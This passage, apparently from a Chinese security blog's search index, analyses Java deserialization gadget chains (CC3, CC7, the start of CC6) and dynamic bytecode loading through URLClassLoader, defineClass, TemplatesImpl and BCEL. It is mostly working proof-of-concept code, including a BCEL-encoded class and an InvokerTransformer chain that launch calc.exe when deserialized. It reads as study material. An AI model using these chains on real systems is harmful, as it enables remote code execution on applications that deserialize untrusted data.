Object[]{\u0026#34;calc\u0026#34;}) }; // ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{}); Map hashMap1 = new HashMap(); Map hashMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer); lazyMap1.put(\u0026#34;yy\u0026#34;, 1); Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer); lazyMap2.put(\u0026#34;zZ\u0026#34;, 1); // System.out.println(lazyMap1.hashCode()); // System.out.println(lazyMap2.hashCode()); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 1); lazyMap2.remove(\u0026#34;yy\u0026#34;); Class c = ChainedTransformer.class; Field field = c.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(chainedTransformer, transformers); serialize(hashtable); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 总结： ","permalink":"http://localhost:1313/xvsf/posts/cc4_cc2_cc5_cc7/","summary":"\u003ch1 id=\"cc4\"\u003eCC4\u003c/h1\u003e\n\u003ch2 id=\"环境\"\u003e环境：\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003c!-- raw HTML omitted --\u003eCommons-Collections 4.0\u003c!-- raw HTML omitted --\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0\"\u003ehttps://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003exml\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"2\"\u003e\u003ca class=\"lnlinks\" href=\"#2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"3\"\u003e\u003ca class=\"lnlinks\" href=\"#3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"4\"\u003e\u003ca class=\"lnlinks\" href=\"#4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"5\"\u003e\u003ca class=\"lnlinks\" href=\"#5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"6\"\u003e\u003ca class=\"lnlinks\" href=\"#6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"7\"\u003e\u003ca class=\"lnlinks\" href=\"#7\"\u003e7\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"8\"\u003e\u003ca class=\"lnlinks\" href=\"#8\"\u003e8\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dependencies\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c\"\u003e\u0026lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.apache.commons\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003ecommons-collections4\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;version\u0026gt;\u003c/span\u003e4.0\u003cspan class=\"nt\"\u003e\u0026lt;/version\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dependencies\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eJDK 8u65\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"分析\"\u003e分析：\u003c/h2\u003e\n\u003cp\u003e以 \u003c!-- raw HTML omitted --\u003eChainedTransformer.transform 为出发点，往回找\u003c!-- raw HTML omitted --\u003e\u003c/p\u003e","title":"CC4_CC2_CC5_CC7"},{"content":"再次深入学习动态加载字节码：\n动态加载字节码 1、什么是Java的字节码 严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。\njava的核心就是跨平台运行，Java编译的结果\u0026ndash;字节码（.class文件）交给 JVM 去运行，同时如果其他语言可以编译为字节码文件，也可以交由 JVM 运行\n2、动态加载字节码的方法 2.1 利用 URLClassLoader 加载远程 class 文件 解释 URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。\n正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：\nURL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。\n2.1.1 file 协议 先编译一个文件：\njava\r1 2 3 4 5 6 7 8 9 10 11 import java.io.IOException; public class Calc { static { try{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch(IOException e){ e.printStackTrace(); } } } 使用 URLClassLoader 加载：\njava\r1 2 3 4 5 6 7 8 9 10 import java.net.URL; import java.net.URLClassLoader; public class ClassLoader_Calc { public static void main(String[] args) throws Exception { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file:///E:\\\\\u0026#34;)}); Class calc = urlClassLoader.loadClass(\u0026#34;Calc\u0026#34;); calc.newInstance(); } } 2.1.2 http 协议 先用python 起一个 http 服务：\npython\r1 python -m http.server 8999 python\r1 2 3 4 5 6 7 8 9 10 11 12 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class HelloClassLoader { public static void main(String[] args) throws MalformedURLException, InstantiationException, IllegalAccessException, ClassNotFoundException { URL[] urls = {new URL(\u0026#34;http://localhost:8999/\u0026#34;)}; URLClassLoader classLoader = URLClassLoader.newInstance(urls); Class c = classLoader.loadClass(\u0026#34;Calc\u0026#34;); c.newInstance(); } } 2.2 利用 ClassLoader#defineClass 直接加载字节码 不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：\nClassLoader#loadClass -\u0026gt; ClassLoader#findClass -\u0026gt; ClassLoader#defineClass\nloadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类 学习如何让系统的 defineClass 来直接加载字节码：\npython\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.reflect.Method; import java.util.Base64; public class DefineClass { public static void main(String[] args) throws Exception { //获取 ClassLoader 的 defineClass 方法 Method defineClass = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); //将 base64 字符串解码成 class 文件的字节码 byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\u0026#34;); //在系统类加载器上调用 defineClass，将字节数组定义成一个 Class 对象 Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Hello\u0026#34;, code, 0, code.length); //调用无参构造 hello.newInstance(); } } 跟进 defineClass 看到它是一个 protected 属性，无法直接访问，所以上述例子中用反射调用。\n2.3 利用 TemplatesImpl 加载字节码 defineClass 方法无法直接使用，但是呢，TemplatesImpl 类中给我们提供了一个入口：\nTemplatesImpl 类继承了 ClassLoader ，并重写 defineClass 方法，并且是可以被外部调用\n现在以 TemplatesImpl#defineClass 为终点跟踪一下这条链：\n查找用法：TemplatesImpl.TransletClassLoader.defineClass\nTemplatesImpl.defineTransletClasses.defineClass\ndefineTransletClasses 函数还是私有的，继续找\n这里查找 defineTransletClasses 的用法后，找到三个结果\ngetTransletClasses 和 getTransletIndex() 都是返回了一个储存值，用于后续操作\n而 getTransletInstance 中 .newInstance() 会调用无参构造创建一个实例，可以用于我们后续的代码执行所以重点跟它\n来到 newTransformer 函数，它是公有的，到这里就可以了\n小总结一下：\nTemplatesImpl.TransletClassLoader.defineClass\nTemplatesImpl.defineTransletClasses.defineClass\nTemplatesImpl.getTransletInstance.defineTransletClasses\nTemplatesImpl.newTransformer.getTransletInstance\nTemplatesImpl\nnewTransformer\ngetTransletInstance\ndefineTransletClasses\ndefineClass\nTransletClassLoader.defineClass\n接下来构造 POC：\n首先满足俩个条件：\n进入 defineTransletClasses -\u0026gt; newInstance\n前后结合一下，将 _bytecodes 构造为一维数组套二维数组：\njava\r1 2 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; _tfactory 这个变量被标记为 transient （不可序列化）\n然后在 readObject 中找：看到已经被赋值了\n先来一个要执行的类：将其编译后放在指定位置\njava\r1 2 3 4 5 6 7 8 9 10 11 import java.io.IOException; public class Test { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class HelloTemplateImpl { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); //这里先赋值看poc是否成功 Field tfactoryFiled = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryFiled.setAccessible(true); tfactoryFiled.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); } } 执行后报错：NullPointerException\n调试查找哪里出了问题：\n可以看到 _transletIndex:-1。我们需要进入到 if 语句才能正常执行\n所以要让执行类继承 AbstractTranslet 类(对应：ABSTRACT_TRANSLET)，\n最终完整的执行类：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Test extends AbstractTranslet{ static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class HelloTemplateImpl { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); Field tfactoryFiled = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryFiled.setAccessible(true); tfactoryFiled.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); } } 2.4 利用 BCEL ClassLoader 加载字节码 BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。\n关于BCEL的详细介绍：《BCEL ClassLoader去哪了》\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; public class BCEL { public static void main(String[] args) throws Exception { Class calc = Class.forName(\u0026#34;Calc\u0026#34;); JavaClass javaClass = Repository.lookupClass(calc); String code = Utility.encode(javaClass.getBytes(),true); System.out.println(code); } } 执行后可以看到有一对乱码：BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。\njava\r1 $l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A BCEL 这个包中有个有趣的类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个 ClassLoader，但是他重写了 Java 内置的ClassLoader#loadClass()方法。\n在 ClassLoader#loadClass() 中，其会判断类名是否是 $$BCEL$$ 开头，如果是的话，将会对这个字符串进行 decode\njava\r1 2 3 4 5 6 7 import com.sun.org.apache.bcel.internal.util.ClassLoader; public class BCELRCE { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException { new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + \u0026#34;$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5$e5$40$_$dc$40$5c$QH$88$b0$88$o8O$87Q$Z$II$95N$Ro$c4$99$L$m$O$3c$A$P$85$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$60$NK$3e$3c$M$fb$Y$c1$a8$871$e3$c7$5dL$f8$c8a$d2$c5$94$8bi$86$fc$86$8a$95$ded$c8Vk$a7$M$ceVr$$$ZJ$a1$8a$e5A$f7$ba$v$d3$T$de$8cH$v$87$89$e0$d1$vO$95$89$3fEG_$a8$O1$c2$z$k$89u$GoCD$9f8F$e9Jx$c9ox$5d$r$f5$dd$c3$ed$5b$n$dbZ$r1$95$V$h$9a$8b$ab$7d$de$b6$Y$da$88$c1o$q$ddT$c8$je$b0$F$83$5b5$bd$B$K$f0$5d$cc$E$98$c5$i$cd$a3$VD$80y$y0$M$fc$c3$O$b0$I$df$iAe$M$7d$b6$o$e2q$ab$7e$d8$bc$94B3$f4$ffH$c7$ddX$abk$9a$e6$b7$a4$fe$O$w$d5Z$f8$a7$86Vv$e4$ad$q$e4r$f5W$b6$a1S$V$b7$d6$7f7$i$a5$89$90$9d$O5$94$da$94$d4$f6$d0$93$94$LI$H$b8$f43$cc$93$B3g$91$ed$a1$a8N$9e$91$cf$ad$3c$82$dd$dbt$406o$c5$y$8ad$83$8f$C$f4$a2D$deC$dfw3$b70$a0$fc$84L9$fb$A$e7$ec$O$de$de$ca$D$f2$f7V$_Po$8e$u$868D_$86$5b$b0$aaKd$P$fdD$fa$9aP$84Cq$99$a2$Bz$5ddB$X$83$O$r$wv$a9$a1w$m$c7$fd$faV$C$A$A\u0026#34;).newInstance(); } } CC3 链分析 环境： JDK ：8u65\ncommons-collections 3.2.1\n分析链 CC3 利用的就是上文分析的 ”利用 TemplatesImpl 加载字节码“这条链，然后结合 CC1/CC6 的前半部分形成可用 POC。\nTemplatesImpl 链： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Test extends AbstractTranslet{ static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class HelloTemplateImpl { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); Field tfactoryFiled = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryFiled.setAccessible(true); tfactoryFiled.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); } } CC1 + CC3 （InvokerTransformer） CC1： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CC1Test { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(Runtime.class); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer); Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 结合一下啊：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CC3 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); Field tfactoryFiled = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryFiled.setAccessible(true); tfactoryFiled.set(templates, new TransformerFactoryImpl()); //templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null, null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(1); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer); Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CC6： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import 